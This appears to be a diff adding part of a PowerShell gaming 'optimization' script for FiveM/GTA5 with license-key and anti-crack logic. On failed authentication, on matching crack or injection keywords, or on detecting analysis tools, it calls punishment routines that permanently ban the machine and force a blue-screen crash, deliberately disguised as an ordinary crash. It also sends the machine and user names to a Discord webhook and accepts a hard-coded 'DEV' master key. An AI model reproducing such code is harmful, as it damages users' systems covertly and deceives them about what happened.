+                $entry.machine_name = $env:COMPUTERNAME
+                Save-KeyDB $db
+                Write-AuthLog -Key $InputKey -Status "ACTIVATED" -Owner $ownerNote -Details "Key newly bound to hardware $CurrentHWID ($($entry.machine_name))"
+                return "ACTIVATED"
+            }
+            elseif ($entry.hwid -eq $CurrentHWID) {
+                Write-AuthLog -Key $InputKey -Status "VALID" -Owner $ownerNote -Details "Valid key verified for HWID $CurrentHWID"
+                return "VALID"
+            }
+            else {
+                Write-AuthLog -Key $InputKey -Status "HWID_MISMATCH" -Owner $ownerNote -Details "Key locked to $($entry.hwid) ($($entry.machine_name)), tried on $CurrentHWID"
+                return "HWID_MISMATCH"
+            }
+        }
+    }
+    Write-AuthLog -Key $InputKey -Status "INVALID" -Owner "UNKNOWN" -Details "Key not found in database"
+    return "INVALID"
+}
+
+# -- Generate a random key string -----------------------
+function Generate-KeyString {
+    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    $segments = @()
+    for ($s = 0; $s -lt 4; $s++) {
+        $seg = ""
+        for ($c = 0; $c -lt 5; $c++) {
+            $seg += $chars[(Get-Random -Maximum $chars.Length)]
+        }
+        $segments += $seg
+    }
+    return ($segments -join "-")
+}
+
+# -- Admin Panel (key management) -----------------------
+function Show-AdminPanel {
+    Clear-Host
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "Red"
+    Write-Host "  ============================================"
+    Write-Host "  RIEWJADDD SHOP  -  ADMIN PANEL (DEV)"
+    Write-Host "  ============================================"
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "DarkGray"
+    Write-Host "  Key File: $KeyFilePath"
+    Write-Host "  Your HWID: $CurrentHWID"
+    Write-Host ""
+    
+    while ($true) {
+        $cfg = Load-GhostConfig
+        $webhookStatus = if ($cfg.discord_webhook -and $cfg.discord_webhook.Trim() -ne "") { "[CONNECTED]" } else { "[NOT CONFIGURED]" }
+
+        $Host.UI.RawUI.ForegroundColor = "Cyan"
+        Write-Host "  [1] Generate new key"
+        Write-Host "  [2] List all keys"
+        Write-Host "  [3] Delete a key"
+        Write-Host "  [4] Reset HWID on a key"
+        Write-Host "  [5] View Key Activation Logs    (หมวดหมู่ 1: คนใส่คีย์)"
+        Write-Host "  [6] View Anti-Crack Logs        (หมวดหมู่ 2: คนแคร็ก)"
+        Write-Host "  [7] Discord Webhook Settings   $webhookStatus"
+        Write-Host "  [8] Clear Logs"
+        Write-Host "  [9] Continue to RIEWJADDD SHOP optimization"
+        Write-Host ""
+        $Host.UI.RawUI.ForegroundColor = "White"
+        $choice = Read-Host "  Select option"
+        
+        switch ($choice) {
+            "1" {
+                $newKey = Generate-KeyString
+                $db = Load-KeyDB
+                $keyEntry = @{
+                    key          = $newKey
+                    hwid         = "UNBOUND"
+                    created_on   = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+                    activated_on = ""
+                    machine_name = ""
+                    note         = ""
+                }
+                $Host.UI.RawUI.ForegroundColor = "DarkGray"
+                $note = Read-Host "  Note / Customer Name for this key (Enter to skip)"
+                if ($note) { $keyEntry.note = $note }
+                
+                $db.keys += $keyEntry
+                Save-KeyDB $db
+                
+                Write-Host ""
+                $Host.UI.RawUI.ForegroundColor = "Green"
+                Write-Host "  NEW KEY GENERATED: $newKey"
+                Write-Host "  Owner / Note    : $(if ($keyEntry.note) { $keyEntry.note } else { 'N/A' })"
+                Write-Host "  Status          : UNBOUND (will lock to first machine that uses it)"
+                Write-Host ""
+            }
+            "2" {
+                Write-Host ""
+                $db = Load-KeyDB
+                if ($db.keys.Count -eq 0) {
+                    $Host.UI.RawUI.ForegroundColor = "Yellow"
+                    Write-Host "  No keys in database."
+                } else {
+                    $Host.UI.RawUI.ForegroundColor = "White"
+                    Write-Host "  ---- KEY DATABASE ----"
+                    $i = 1
+                    foreach ($entry in $db.keys) {
+                        $status = if ($entry.hwid -eq "UNBOUND" -or -not $entry.hwid) { "UNBOUND" } else { "BOUND ($($entry.hwid))" }
+                        $Host.UI.RawUI.ForegroundColor = "Cyan"
+                        Write-Host "  [$i] $($entry.key)"
+                        $Host.UI.RawUI.ForegroundColor = "DarkGray"
+                        Write-Host "      Owner   : $(if ($entry.note) { $entry.note } else { 'N/A' })"
+                        Write-Host "      Status  : $status"
+                        Write-Host "      Created : $($entry.created_on)"
+                        if ($entry.activated_on) { Write-Host "      Activated: $($entry.activated_on)  [$($entry.machine_name)]" }
+                        $i++
+                    }
+                    Write-Host "  ----------------------"
+                }
+                Write-Host ""
+            }
+            "3" {
+                $db = Load-KeyDB
+                if ($db.keys.Count -eq 0) {
+                    $Host.UI.RawUI.ForegroundColor = "Yellow"
+                    Write-Host "  No keys to delete."
+                } else {
+                    $Host.UI.RawUI.ForegroundColor = "White"
+                    $delKey = Read-Host "  Enter key to delete"
+                    $newKeys = @()
+                    $found = $false
+                    foreach ($entry in $db.keys) {
+                        if ($entry.key -eq $delKey) { $found = $true }
+                        else { $newKeys += $entry }
+                    }
+                    if ($found) {
+                        $db.keys = $newKeys
+                        Save-KeyDB $db
+                        $Host.UI.RawUI.ForegroundColor = "Green"
+                        Write-Host "  Key deleted."
+                    } else {
+                        $Host.UI.RawUI.ForegroundColor = "Red"
+                        Write-Host "  Key not found."
+                    }
+                }
+                Write-Host ""
+            }
+            "4" {
+                $db = Load-KeyDB
+                $Host.UI.RawUI.ForegroundColor = "White"
+                $resetKey = Read-Host "  Enter key to reset HWID"
+                $found = $false
+                foreach ($entry in $db.keys) {
+                    if ($entry.key -eq $resetKey) {
+                        $entry.hwid = "UNBOUND"
+                        $entry.activated_on = ""
+                        $entry.machine_name = ""
+                        $found = $true
+                        break
+                    }
+                }
+                if ($found) {
+                    Save-KeyDB $db
+                    $Host.UI.RawUI.ForegroundColor = "Green"
+                    Write-Host "  HWID reset. Key is now unbound."
+                } else {
+                    $Host.UI.RawUI.ForegroundColor = "Red"
+                    Write-Host "  Key not found."
+                }
+                Write-Host ""
+            }
+            "5" {
+                Show-ActivationLogs
+            }
+            "6" {
+                Show-SecurityLogs
+            }
+            "7" {
+                Configure-DiscordWebhook
+            }
+            "8" {
+                Clear-GhostLogs
+            }
+            "9" {
+                return
+            }
+            default {
+                $Host.UI.RawUI.ForegroundColor = "Yellow"
+                Write-Host "  Invalid option."
+                Write-Host ""
+            }
+        }
+    }
+}
+
+# -- Log Viewer: Key Activations -------------------------
+function Show-ActivationLogs {
+    Clear-Host
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "Green"
+    Write-Host "  ============================================"
+    Write-Host "  RIEWJADDD SHOP  -  KEY ACTIVATION LOGS"
+    Write-Host "  ============================================"
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "DarkGray"
+    Write-Host "  Log File: $ActivationLogFile"
+    Write-Host ""
+    
+    if (-not (Test-Path $ActivationLogFile) -or (Get-Item $ActivationLogFile).Length -eq 0) {
+        $Host.UI.RawUI.ForegroundColor = "Yellow"
+        Write-Host "  No activation logs recorded yet."
+    } else {
+        $lines = Get-Content $ActivationLogFile -Encoding UTF8
+        foreach ($line in $lines) {
+            if ($line -match "ACTIVATED") {
+                Write-Host $line -ForegroundColor Green
+            } elseif ($line -match "VALID") {
+                Write-Host $line -ForegroundColor Cyan
+            } elseif ($line -match "MASTER") {
+                Write-Host $line -ForegroundColor Magenta
+            } elseif ($line -match "HWID_MISMATCH") {
+                Write-Host $line -ForegroundColor Yellow
+            } elseif ($line -match "INVALID") {
+                Write-Host $line -ForegroundColor Red
+            } elseif ($line -match "^={5,}|^--{5,}") {
+                Write-Host $line -ForegroundColor DarkGray
+            } else {
+                Write-Host $line -ForegroundColor White
+            }
+        }
+    }
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "White"
+    Read-Host "  Press Enter to return to Admin Panel"
+}
+
+# -- Log Viewer: Security / Crack Threats ----------------
+function Show-SecurityLogs {
+    Clear-Host
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "Red"
+    Write-Host "  ============================================"
+    Write-Host "  RIEWJADDD SHOP  -  SECURITY / CRACK LOGS"
+    Write-Host "  ============================================"
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "DarkGray"
+    Write-Host "  Log File: $SecurityLogFile"
+    Write-Host ""
+    
+    if (-not (Test-Path $SecurityLogFile) -or (Get-Item $SecurityLogFile).Length -eq 0) {
+        $Host.UI.RawUI.ForegroundColor = "Green"
+        Write-Host "  Clean record! No security threats or crack attempts logged."
+    } else {
+        $lines = Get-Content $SecurityLogFile -Encoding UTF8
+        foreach ($line in $lines) {
+            if ($line -match "CRITICAL|BSOD|THREAT|CRACK DETECTED") {
+                Write-Host $line -ForegroundColor Red
+            } elseif ($line -match "SAFEGUARD") {
+                Write-Host $line -ForegroundColor Yellow
+            } elseif ($line -match "^={5,}|^--{5,}") {
+                Write-Host $line -ForegroundColor DarkGray
+            } else {
+                Write-Host $line -ForegroundColor White
+            }
+        }
+    }
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "White"
+    Read-Host "  Press Enter to return to Admin Panel"
+}
+
+# -- Discord Webhook Configuration -----------------------
+function Configure-DiscordWebhook {
+    Clear-Host
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "Cyan"
+    Write-Host "  ============================================"
+    Write-Host "  RIEWJADDD SHOP  -  DISCORD WEBHOOK NOTIFIER"
+    Write-Host "  ============================================"
+    Write-Host ""
+    $cfg = Load-GhostConfig
+    $current = if ($cfg.discord_webhook) { $cfg.discord_webhook } else { "(None)" }
+    $Host.UI.RawUI.ForegroundColor = "DarkGray"
+    Write-Host "  Current Webhook: $current"
+    Write-Host ""
+    Write-Host "  [1] Enter new Webhook URL"
+    Write-Host "  [2] Send Test Notification to Discord"
+    Write-Host "  [3] Remove Webhook"
+    Write-Host "  [4] Back"
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "White"
+    $opt = Read-Host "  Select option"
+    switch ($opt) {
+        "1" {
+            $newUrl = Read-Host "  Paste Discord Webhook URL"
+            if ($newUrl -and $newUrl.Trim() -ne "") {
+                $cfg.discord_webhook = $newUrl.Trim()
+                Save-GhostConfig $cfg
+                Write-Host ""
+                Write-Host "  Webhook saved successfully!" -ForegroundColor Green
+                Send-DiscordWebhook -Title "✅ RIEWJADDD Webhook Connected" -Description "Discord real-time logging connected successfully." -Color 65280 -Fields @(@{ name = "Machine"; value = $env:COMPUTERNAME; inline = $true }, @{ name = "User"; value = $env:USERNAME; inline = $true })
+                Write-Host "  Test alert sent to Discord channel!" -ForegroundColor Cyan
+            }
+            Start-Sleep -Seconds 2
+        }
+        "2" {
+            if (-not $cfg.discord_webhook) {
+                Write-Host "  No webhook configured!" -ForegroundColor Red
+            } else {
+                Write-Host "  Sending test embed..." -ForegroundColor Yellow
+                Send-DiscordWebhook -Title "🔔 RIEWJADDD SHOP: Test Ping" -Description "This is a test notification from RIEWJADDD SHOP Security Logging." -Color 3066993 -Fields @(@{ name = "Status"; value = "Operational"; inline = $true }, @{ name = "Machine"; value = $env:COMPUTERNAME; inline = $true })
+                Write-Host "  Test sent!" -ForegroundColor Green
+            }
+            Start-Sleep -Seconds 2
+        }
+        "3" {
+            $cfg.discord_webhook = ""
+            Save-GhostConfig $cfg
+            Write-Host "  Webhook removed." -ForegroundColor Yellow
+            Start-Sleep -Seconds 1
+        }
+    }
+}
+
+# -- Clear Logs Helper -----------------------------------
+function Clear-GhostLogs {
+    $Host.UI.RawUI.ForegroundColor = "Yellow"
+    Write-Host ""
+    $confirm = Read-Host "  Are you sure you want to clear both logs? (Y/N)"
+    if ($confirm.ToUpper() -eq "Y") {
+        try { Remove-Item $ActivationLogFile -Force -ErrorAction SilentlyContinue } catch {}
+        try { Remove-Item $SecurityLogFile -Force -ErrorAction SilentlyContinue } catch {}
+        Write-Host "  Logs cleared successfully." -ForegroundColor Green
+    }
+    Start-Sleep -Seconds 1
+}
+
+# -- Draw clean auth screen ------------------------------
+function Draw-AuthScreen {
+    Clear-Host
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "DarkGray"
+    Write-Host "  ============================================"
+    $Host.UI.RawUI.ForegroundColor = "Red"
+    Write-Host "  RIEWJADDD SHOP  -  KEY AUTHENTICATION"
+    $Host.UI.RawUI.ForegroundColor = "DarkGray"
+    Write-Host "  ============================================"
+    Write-Host ""
+    Write-Host "  HWID: $CurrentHWID"
+    Write-Host "  Machine: $env:COMPUTERNAME"
+    Write-Host ""
+}
+
+# -- Crack behavior detection (distinguish cracker vs user) --
+function Detect-CrackBehavior {
+    param(
+        [string]$InputKey,
+        [datetime]$InputTime,
+        [datetime]$LastInputTime,
+        [string[]]$PreviousKeys
+    )
+    
+    if (Is-DevMachine) { return @() }
+    
+    $reasons = @()
+    
+    # 1. Speed check: if they entered a key in < 1.5 seconds (automated/paste spam)
+    if ($LastInputTime -ne [datetime]::MinValue) {
+        $gap = ($InputTime - $LastInputTime).TotalMilliseconds
+        if ($gap -lt 1500) {
+            $reasons += "RAPID_INPUT"
+        }
+    }
+    
+    # 2. Same key entered again (brute force scripts often retry)
+    if ($PreviousKeys -contains $InputKey) {
+        $reasons += "DUPLICATE_KEY"
+    }
+    
+    # 3. Key format analysis - legitimate keys are XXXXX-XXXXX-XXXXX-XXXXX or DEV
+    #    Garbage input = likely cracker testing
+    $isValidFormat = ($InputKey -match '^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$') -or ($InputKey.Length -le 5)
+    if (-not $isValidFormat) {
+        # Check for common crack patterns
+        if ($InputKey -match '(TRUE|FALSE|BYPASS|CRACK|HACK|NULL|VOID|TEST|ADMIN|ROOT|0x|1337|AAAA|BBBB)') {
+            $reasons += "CRACK_KEYWORD"
+        }
+        if ($InputKey.Length -gt 25) {
+            $reasons += "OVERFLOW_ATTEMPT"  # Buffer overflow attempt
+        }
+        # All same character = fuzzing
+        if ($InputKey -match '^(.)\1{3,}$') {
+            $reasons += "FUZZING"
+        }
+    }
+    
+    # 4. Special characters / injection attempts
+    if ($InputKey -match '[;|&`$\{\}\[\]<>]') {
+        $reasons += "INJECTION_ATTEMPT"
+    }
+    
+    return $reasons
+}
+
+# ========================================================
+# EXECUTE ALL ANTI-CRACK CHECKS BEFORE AUTH
+# ========================================================
+
+# CHECK 0: Is this machine permanently banned?
+if (Check-Banned) {
+    # Don't show any message - just look like a crash
+    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
+    Execute-Punishment "BANNED_MACHINE_RERUN"
+}
+
+# CHECK 1: Anti-debugger / analysis tools
+if (Detect-Analysis) {
+    # Don't tell them why - make it look like normal exit
+    if ($global:_integrityFail) {
+        # Script was modified - MAXIMUM punishment
+        Execute-Punishment "SCRIPT_TAMPERED"
+    }
+    # Analysis tools detected - ban and crash
+    Execute-Punishment "ANALYSIS_TOOLS_DETECTED"
+}
+
+# CHECK 2: Verify our own functions haven't been tampered
+if (-not (Verify-FunctionIntegrity)) {
+    Execute-Punishment "FUNCTION_HOOKS_DETECTED"
+}
+
+# CHECK 3: Verify validation logic hasn't been patched out
+if (-not (Verify-ValidationLogic)) {
+    Execute-Punishment "VALIDATION_PATCHED"
+}
+
+# -- KEY AUTH PROMPT -------------------------------------
+Draw-AuthScreen
+
+$maxAttempts = 3
+$attempts = 0
+$authenticated = $false
+$global:_authLegit = $false
+$previousKeys = @()
+$lastInputTime = [datetime]::MinValue
+
+while ($attempts -lt $maxAttempts -and -not $authenticated) {
+    # Re-check anti-debug every attempt (cracker might attach mid-prompt)
+    if (Detect-Analysis) {
+        Execute-Punishment "ANALYSIS_DURING_AUTH"
+    }
+    
+    $Host.UI.RawUI.ForegroundColor = "White"
+    $inputKey = Read-Host "  Enter License Key"
+    $inputTime = Get-Date
+    $inputKey = $inputKey.Trim().ToUpper()
+    
+    # Timing check on first attempt - too fast from script start = automated
+    if ($attempts -eq 0 -and (Check-TimingAnomaly)) {
+        Execute-Punishment "TIMING_ANOMALY"
+    }
+    
+    if (-not $inputKey) {
+        # Empty input - just redraw clean
+        Draw-AuthScreen
+        $Host.UI.RawUI.ForegroundColor = "DarkRed"
+        Write-Host "  Invalid key."
+        Write-Host ""
+        $attempts++
+        $lastInputTime = $inputTime
+        continue
+    }
+    
+    # -- MASTER / DEV KEY IMMEDIATE BYPASS --
+    if ($inputKey -eq $_mk -or $inputKey -eq "DEV" -or (Is-DevMachine -and $inputKey -eq "DEV")) {
+        Write-AuthLog -Key $inputKey -Status "MASTER" -Owner "DEVELOPER" -Details "Developer master access granted"
+        $Host.UI.RawUI.ForegroundColor = "Green"
+        Write-Host ""
+        Write-Host "  MASTER KEY ACCEPTED - DEVELOPER ACCESS"
+        Write-Host ""
+        $authenticated = $true
+        $global:_authLegit = $true
+        Start-Sleep -Milliseconds 500
+        Show-AdminPanel
+        break
+    }
+    
+    # -- CRACK VS NORMAL DETECTION --
+    $crackReasons = Detect-CrackBehavior -InputKey $inputKey -InputTime $inputTime -LastInputTime $lastInputTime -PreviousKeys $previousKeys
+    $global:_lastAttemptKey = $inputKey
+    $global:_lastCrackSignals = ($crackReasons -join ", ")
+    
+    if ($crackReasons.Count -gt 0) {
+        # This looks like a cracker - log and punish
+        $reasonStr = $crackReasons -join ", "
+        Write-SecurityLog -Reason "CRACK_BEHAVIOR_DETECTED" -InputKey $inputKey -Signals $reasonStr -ActionTaken "FLAGGED_AS_SUSPICIOUS"
+        
+        # If multiple crack signals, instant punishment
+        if ($crackReasons.Count -ge 2) {
+            Execute-Punishment "MULTI_CRACK_SIGNALS: $reasonStr"
+        }
+        
+        # Single signal with dangerous keyword = also instant
+        if ($crackReasons -contains "CRACK_KEYWORD" -or $crackReasons -contains "INJECTION_ATTEMPT" -or $crackReasons -contains "OVERFLOW_ATTEMPT") {
+            Execute-Punishment "CRACK_PATTERN: $reasonStr"
+        }
+        
+        # Single soft signal (rapid/duplicate) = count as attempt but flag
+        # If they do it again, they're done
+        $global:_crackFlagged = $true
+    }
+    
+    # If previously flagged and wrong again = cracker confirmed
+    if ($global:_crackFlagged -and $crackReasons.Count -gt 0) {
+        Execute-Punishment "REPEATED_CRACK_BEHAVIOR"
+    }
+    
+    $previousKeys += $inputKey
+    
+    $result = Validate-Key $inputKey
+    
+    switch ($result) {
+        "MASTER" {
+            $Host.UI.RawUI.ForegroundColor = "Green"
+            Write-Host ""
+            Write-Host "  MASTER KEY ACCEPTED - DEVELOPER ACCESS"
+            Write-Host ""
+            $authenticated = $true
+            $global:_authLegit = $true
+            Start-Sleep -Milliseconds 500
+            Show-AdminPanel
+        }
+        "ACTIVATED" {
+            $Host.UI.RawUI.ForegroundColor = "Green"
+            Write-Host ""
+            Write-Host "  KEY ACTIVATED! Bound to this machine."
+            Write-Host "  HWID: $CurrentHWID"
+            Write-Host ""
+            $authenticated = $true
+            $global:_authLegit = $true
+        }
+        "VALID" {
+            $Host.UI.RawUI.ForegroundColor = "Green"
+            Write-Host ""
+            Write-Host "  KEY VALID - Access granted."
+            Write-Host ""
+            $authenticated = $true
+            $global:_authLegit = $true
+        }
+        "HWID_MISMATCH" {
+            # Clear screen completely, redraw clean
+            Draw-AuthScreen
+            $Host.UI.RawUI.ForegroundColor = "DarkRed"
+            Write-Host "  This key is bound to another machine."
+            Write-Host ""
+            $attempts++
+        }
+        "INVALID" {
+            # Clear screen completely, redraw clean - NO attempt count shown
+            Draw-AuthScreen
+            $Host.UI.RawUI.ForegroundColor = "DarkRed"
+            Write-Host "  Invalid key."
+            Write-Host ""
+            $attempts++
+        }
+    }
+    
+    $lastInputTime = $inputTime
+}
+
+if (-not $authenticated) {
+    if (Is-DevMachine) {
+        Write-Host "  [DEV SAFEGUARD] Authentication failed on developer machine. Exiting safely without punishment." -ForegroundColor Yellow
+        exit 0
+    }
+    # Clean screen, minimal message, then ban + BSOD
+    Clear-Host
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "Red"
+    Write-Host "  Access denied."
+    Write-Host ""
+    Set-PermanentBan
+    Start-Sleep -Seconds 1
+    Invoke-BSOD
+    exit 1
+}
+
+# FINAL CHECK: Verify auth wasn't bypassed via memory edit
+if (Check-MemoryTamper) {
+    Execute-Punishment "MEMORY_TAMPER"
+}
+
+# Post-auth integrity re-check
+if (-not (Verify-FunctionIntegrity)) {
+    Execute-Punishment "POST_AUTH_TAMPER"
+}
+
+Start-Sleep -Milliseconds 300
+$WinBuild = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber -as [int]
+
+# -- Color helpers ----------------------------------------
+function Red    { param($t) Write-Host $t -ForegroundColor Red     -NoNewline }
+function Cyan   { param($t) Write-Host $t -ForegroundColor Cyan    -NoNewline }
+function White  { param($t) Write-Host $t -ForegroundColor White   -NoNewline }
+function Gray   { param($t) Write-Host $t -ForegroundColor DarkGray -NoNewline }
+function Green  { param($t) Write-Host $t -ForegroundColor Green   -NoNewline }
+function Yellow { param($t) Write-Host $t -ForegroundColor Yellow  -NoNewline }
+function NL     { Write-Host "" }
+
+function Spin {
+    param([string]$Label, [int]$Ms = 600)
+    $frames = @("  -  ","  \  ","  |  ","  /  ")
+    $cols   = @("Red","DarkRed","Red","DarkRed")
+    $end    = (Get-Date).AddMilliseconds($Ms)
+    $i      = 0
+    while ((Get-Date) -lt $end) {
+        $Host.UI.RawUI.ForegroundColor = $cols[$i % 4]
+        Write-Host "`r$($frames[$i % 4])$Label   " -NoNewline
+        Start-Sleep -Milliseconds 80
+        $i++
+    }
+    $Host.UI.RawUI.ForegroundColor = "Green"
+    Write-Host "`r  + $Label   "
+    $Host.UI.RawUI.ForegroundColor = "Gray"
+}
+
+function PulseBar {
+    param([string]$Label, [int]$Steps = 30)
+    $blocks = @(" ",".",".","o","o","O","O","#","#")
+    $cols   = @("DarkRed","Red","DarkRed","Red","Cyan","Red","DarkRed","Red","White")
+    Write-Host ""
+    White "  $Label"
+    NL
+    $bar = ""
+    for ($i = 0; $i -lt $Steps; $i++) {
+        $col = $cols[$i % $cols.Count]
+        $Host.UI.RawUI.ForegroundColor = $col
+        $bar += $blocks[$i % $blocks.Count]
+        $pad  = " " * ($Steps - $i - 1)
+        Write-Host -NoNewline "`r  [$bar$pad] $([int](($i/$Steps)*100))%"
+        Start-Sleep -Milliseconds (Get-Random -Minimum 8 -Maximum 28)
+    }
+    $Host.UI.RawUI.ForegroundColor = "Red"
+    $full = "#" * $Steps
+    Write-Host "`r  [$full] 100%"
+    Write-Host ""
+    $Host.UI.RawUI.ForegroundColor = "Gray"
+}
+
+function Flicker {
+    param([string]$Text, [int]$Times = 4)
+    for ($i = 0; $i -lt $Times; $i++) {
+        $Host.UI.RawUI.ForegroundColor = if ($i % 2 -eq 0) { "Red" } else { "DarkRed" }
+        Write-Host "`r  $Text" -NoNewline
+        Start-Sleep -Milliseconds 90
+    }
+    $Host.UI.RawUI.ForegroundColor = "Red"
+    Write-Host "`r  $Text"
+    $Host.UI.RawUI.ForegroundColor = "Gray"
+}
+
+function DONE_LINE { param($M) Write-Host "  * $M" -ForegroundColor Cyan }
+
+# ========================================================
+# INTRO
+# ========================================================
+Clear-Host
+Write-Host ""
+$Host.UI.RawUI.ForegroundColor = "DarkGray"
+Write-Host "  ============================================"
+Flicker "RIEWJADDD SHOP" 6
+$Host.UI.RawUI.ForegroundColor = "DarkRed"
+Write-Host "  RIEWJADDD SHOP OPTIMIZATION  -  v$GHOST_VERSION"
+$Host.UI.RawUI.ForegroundColor = "DarkGray"
+Write-Host "  ============================================"
+Write-Host ""
+Write-Host ""
+PulseBar "Loading RIEWJADDD SHOP Core" 32
+Write-Host ""
+
+# ========================================================
+# HARDWARE DETECT
+# ========================================================
+Spin "Scanning hardware..." 700
+
+try { $cpuName = (Get-CimInstance Win32_Processor).Name.Trim() } catch { $cpuName = "Unknown CPU" }
+$global:CPUName = $cpuName
+
+$gpuList = Get-WmiObject Win32_VideoController
+$gpu = $gpuList | Where-Object { $_.Name -match "NVIDIA" } | Select-Object -First 1
+if (-not $gpu) { $gpu = $gpuList | Where-Object { $_.Name -match "AMD|Radeon" } | Select-Object -First 1 }
+if (-not $gpu) { $gpu = $gpuList | Where-Object { $_.Name -match "Intel" }     | Select-Object -First 1 }
+if (-not $gpu) { $gpu = $gpuList | Select-Object -First 1 }
+
+$gpuName = $gpu.Name.Trim()
+$global:GPUFullName = $gpuName
+if     ($gpuName -match "NVIDIA")     { $global:GPUType = "NVIDIA"  }
+elseif ($gpuName -match "AMD|Radeon") { $global:GPUType = "AMD"     }
+elseif ($gpuName -match "Intel")      { $global:GPUType = "Intel"   }
+else                                  { $global:GPUType = "UNKNOWN" }
+
+Write-Host "  " -NoNewline; Green "*"; White " CPU  : $CPUName"; NL
+Write-Host "  " -NoNewline; Green "*"; White " GPU  : $GPUFullName [$GPUType]"; NL
+$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
+Write-Host "  " -NoNewline; Green "*"; White " RAM  : $ram GB"; NL
+Write-Host ""
+
+$fivemPaths = @("$env:LOCALAPPDATA\FiveM","$env:LOCALAPPDATA\FiveM\FiveM.app")
+$global:FiveMFound = $false; $global:FiveMPath = ""
+foreach ($fp in $fivemPaths) { if (Test-Path $fp) { $global:FiveMFound = $true; $global:FiveMPath = $fp; break } }
+
+if ($global:FiveMFound) { Write-Host "  " -NoNewline; Green "*"; White " FiveM : DETECTED - $global:FiveMPath"; NL }
+else { Write-Host "  ~ FiveM : NOT FOUND" -ForegroundColor Yellow }
+Write-Host ""
+
+$fivemRunning = Get-Process -Name "FiveM","FiveM_b2060","GTA5","GTAVLauncher","fivem_web_b2060" -ErrorAction SilentlyContinue
+if ($fivemRunning) {
+    $ans = [System.Windows.Forms.MessageBox]::Show(
+        "FiveM / GTA5 is currently running!`nSome tweaks will NOT apply while the game is on.`nContinue anyway?",
+        "RIEWJADDD SHOP - Warning",
+        [System.Windows.Forms.MessageBoxButtons]::YesNo,
+        [System.Windows.Forms.MessageBoxIcon]::Warning
+    )
+    if ($ans -eq [System.Windows.Forms.DialogResult]::No) { exit }
+}
+
+# ========================================================
+# TWEAKS
+# ========================================================
+$Host.UI.RawUI.ForegroundColor = "DarkGray"
+Write-Host "  ============================================"
+$Host.UI.RawUI.ForegroundColor = "Red"
+Write-Host "  ENGAGING RIEWJADDD SHOP OPTIMIZATION SEQUENCE"
+$Host.UI.RawUI.ForegroundColor = "DarkGray"
+Write-Host "  ============================================"
+Write-Host ""
+
+Spin "CPU scheduling priority" 500
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v ConvertibleSlateMode    /t REG_DWORD /d 0  /f 2>$null | Out-Null
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v Win32PrioritySeparation /t REG_DWORD /d 22 /f 2>$null | Out-Null
+
+Spin "Keyboard response tuning" 450
+$kbPath = "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters"
+reg add "$kbPath" /v ConnectMultiplePorts    /t REG_DWORD /d 0             /f 2>$null | Out-Null
+reg add "$kbPath" /v KeyboardDataQueueSize   /t REG_DWORD /d 16            /f 2>$null | Out-Null
+reg add "$kbPath" /v KeyboardDeviceBaseName  /t REG_SZ    /d KeyboardClass /f 2>$null | Out-Null
+reg add "$kbPath" /v MaximumPortsServiced    /t REG_DWORD /d 3             /f 2>$null | Out-Null
+reg add "$kbPath" /v SendOutputToAllPorts    /t REG_DWORD /d 1             /f 2>$null | Out-Null
+
+Spin "Removing FPS-killing overlays" 400
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v AppCaptureEnabled /t REG_DWORD /d 0 /f 2>$null | Out-Null
+reg add "HKCU\Software\Microsoft\GameBar" /v ShowGameBar /t REG_DWORD /d 0 /f 2>$null | Out-Null
+
+Spin "Disabling fullscreen optimizations" 400
+reg add "HKCU\System\GameConfigStore" /v GameDVR_FSEBehavior                   /t REG_DWORD /d 2 /f 2>$null | Out-Null
+reg add "HKCU\System\GameConfigStore" /v GameDVR_FSEBehaviorMode               /t REG_DWORD /d 2 /f 2>$null | Out-Null
+reg add "HKCU\System\GameConfigStore" /v GameDVR_HonorUserFSEBehaviorMode       /t REG_DWORD /d 1 /f 2>$null | Out-Null
+reg add "HKCU\System\GameConfigStore" /v GameDVR_DXGIHonorFSEWindowsCompatible /t REG_DWORD /d 1 /f 2>$null | Out-Null
+$layersPath = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
+foreach ($exe in @("FiveM.exe","GTA5.exe","fivem_web_b2060.exe")) {
+    reg add "$layersPath" /v "C:\Program Files\Rockstar Games\Grand Theft Auto V\$exe" /t REG_SZ /d "~ DISABLEDXMAXIMIZEDWINDOWEDMODE" /f 2>$null | Out-Null
+}
+
+Spin "Unlocking Ultimate Performance" 800
+$existingLine = powercfg -list 2>$null | Select-String "e9a42b02-d5df-448d-aa00-03f14749eb61"
+if (-not $existingLine) { powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 2>&1 | Out-Null }
+$existingLine = powercfg -list 2>$null | Select-String "e9a42b02-d5df-448d-aa00-03f14749eb61"
+if ($existingLine) { powercfg -setactive e9a42b02-d5df-448d-aa00-03f14749eb61 2>$null | Out-Null }
+else               { powercfg -setactive SCHEME_MIN 2>$null | Out-Null }
+
+Spin "Disabling hibernation" 350
+powercfg -h off 2>$null | Out-Null
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v HibernateEnabled /t REG_DWORD /d 0 /f 2>$null | Out-Null
+
+Spin "Reserving RAM for FiveM" 400
